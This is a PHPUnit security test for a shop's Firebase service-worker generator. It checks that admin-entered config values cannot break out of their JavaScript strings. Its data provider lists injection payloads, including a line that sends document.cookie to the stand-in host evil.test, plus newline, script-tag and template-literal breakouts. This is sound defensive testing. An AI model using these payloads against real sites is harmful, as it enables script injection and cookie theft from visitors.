<?php

namespace Tests\Feature\Security;

use App\Services\PushNotificationService;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * The firebase-messaging-sw.js file is the service worker every browser that enabled notifications registers at the shop's origin, and the
 * admin's Firebase settings were written into it between double quotes. A service worker sees and can answer every request of the origin
 * (the admin panel's included), so a value such as `"});fetch(...)//` made the settings form a way to run script for every returning visitor.
 */
class FirebaseServiceWorkerTest extends TestCase
{
    private const KEYS = ['apiKey', 'authDomain', 'projectId', 'storageBucket', 'messagingSenderId', 'appId', 'measurementId'];

    private function script(array $config): string
    {
        return (new PushNotificationService())->firebaseServiceWorkerScript(config: $config);
    }

    /** @return array<string, string> */
    private function plainConfig(): array
    {
        return [
            'apiKey' => 'AIzaSyD-9tSrke72PouQMnMX-a7eZSW0jkFMBWY', 'authDomain' => 'shop-12345.firebaseapp.com', 'projectId' => 'shop-12345',
            'storageBucket' => 'shop-12345.appspot.com', 'messagingSenderId' => '123456789012', 'appId' => '1:123456789012:web:abcdef0123456789',
            'measurementId' => 'G-ABCDE12345',
        ];
    }

    public function test_a_plain_configuration_produces_the_same_file_as_before(): void
    {
        $config = $this->plainConfig();

        $expected = <<<JS
            importScripts('https://www.gstatic.com/firebasejs/8.3.2/firebase-app.js');
            importScripts('https://www.gstatic.com/firebasejs/8.3.2/firebase-messaging.js');
            importScripts('https://www.gstatic.com/firebasejs/8.3.2/firebase-auth.js');

            firebase.initializeApp({
                apiKey: "{$config['apiKey']}",
                authDomain: "{$config['authDomain']}",
                projectId: "{$config['projectId']}",
                storageBucket: "{$config['storageBucket']}",
                messagingSenderId: "{$config['messagingSenderId']}",
                appId: "{$config['appId']}",
                measurementId: "{$config['measurementId']}"
            });

            const messaging = firebase.messaging();
            messaging.setBackgroundMessageHandler(function(payload) {
                return self.registration.showNotification(payload.data.title, {
                    body: payload.data.body || '',
                    icon: payload.data.icon || ''
                });
            });
            JS;

        $this->assertSame($expected, $this->script($config));
    }

    public function test_missing_values_are_empty_strings(): void
    {
        $script = $this->script([]);

        foreach (self::KEYS as $key) {
            $this->assertStringContainsString($key . ': ""', $script);
        }
    }

    /** @return array<string, array{0: mixed}> */
    public static function valuesThatAreNotJustAKey(): array
    {
        return [
            'a quote that closes the string and runs code' => ['"});fetch("//evil.test/?c="+document.cookie);//'],
            'a single quote' => ["x');fetch('//evil.test/');//"],
            'a backslash before the closing quote' => ['\\'],
            'a line break' => ["a\n});fetch('//evil.test/');//"],
            'a carriage return' => ["a\r});fetch('//evil.test/');//"],
            'the line separator of javascript' => ["a\u{2028}});fetch('//evil.test/');//"],
            'a closing script tag' => ['</script><script>alert(1)</script>'],
            'a template literal' => ['`${fetch("//evil.test/")}`'],
            'text with an ampersand and a slash' => ['a&b/c'],
            'a null byte' => ["a\0b"],
            'non-latin text' => ['مفتاح'],
            'a list' => [['"});fetch("//evil.test/");//']],
        ];
    }

    #[DataProvider('valuesThatAreNotJustAKey')]
    public function test_a_value_stays_one_string_of_one_line(mixed $value): void
    {
        $plainLines = substr_count($this->script($this->plainConfig()), "\n");

        foreach (self::KEYS as $key) {
            $script = $this->script([$key => $value] + $this->plainConfig());

            $this->assertSame($plainLines, substr_count($script, "\n"), $key . ' added a line');
            $this->assertSame(1, preg_match('/^\s+' . $key . ': ("(?:[^"\\\\]|\\\\.)*")(,?)$/m', $script, $match), $key);
            $this->assertSame(is_scalar($value) ? (string)$value : '', json_decode($match[1]), $key . ' is not the string it was given');
            $this->assertStringNotContainsString('</script', $script);
        }
    }

    #[DataProvider('valuesThatAreNotJustAKey')]
    public function test_the_script_runs_as_a_configuration_and_nothing_else(mixed $value): void
    {
        $node = trim((string)shell_exec('command -v node'));
        if ($node === '') {
            $this->markTestSkipped('node is not installed');
        }

        $scriptFile = tempnam(sys_get_temp_dir(), 'sw');
        $configFile = tempnam(sys_get_temp_dir(), 'cfg');
        $harness = tempnam(sys_get_temp_dir(), 'run');
        file_put_contents($scriptFile, $this->script(['apiKey' => $value, 'appId' => $value, 'measurementId' => $value] + $this->plainConfig()));
        file_put_contents($harness, <<<'JS'
            const vm = require('vm'), fs = require('fs');
            const calls = [];
            let received = null;
            const sandbox = {
                importScripts: () => {}, self: { registration: {} }, fetch: (...a) => { calls.push(['fetch', a]); }, document: {}, XMLHttpRequest: function () { calls.push(['xhr']); },
                firebase: { initializeApp: (c) => { received = c; }, messaging: () => ({ setBackgroundMessageHandler: () => {} }) },
            };
            vm.runInNewContext(fs.readFileSync(process.argv[2], 'utf8'), sandbox);
            fs.writeFileSync(process.argv[3], JSON.stringify({ received, calls }));
            JS);

        exec(escapeshellarg($node) . ' ' . escapeshellarg($harness) . ' ' . escapeshellarg($scriptFile) . ' ' . escapeshellarg($configFile) . ' 2>&1', $output, $status);
        $result = json_decode((string)file_get_contents($configFile), true);
        array_map('unlink', [$scriptFile, $configFile, $harness]);

        $this->assertSame(0, $status, implode("\n", $output));
        $expected = is_scalar($value) ? (string)$value : '';
        $this->assertSame([], $result['calls'], 'the configuration ran code');
        $this->assertSame($expected, $result['received']['apiKey']);
        $this->assertSame($expected, $result['received']['appId']);
        $this->assertSame($expected, $result['received']['measurementId']);
        $this->assertSame($this->plainConfig()['projectId'], $result['received']['projectId']);
    }
}
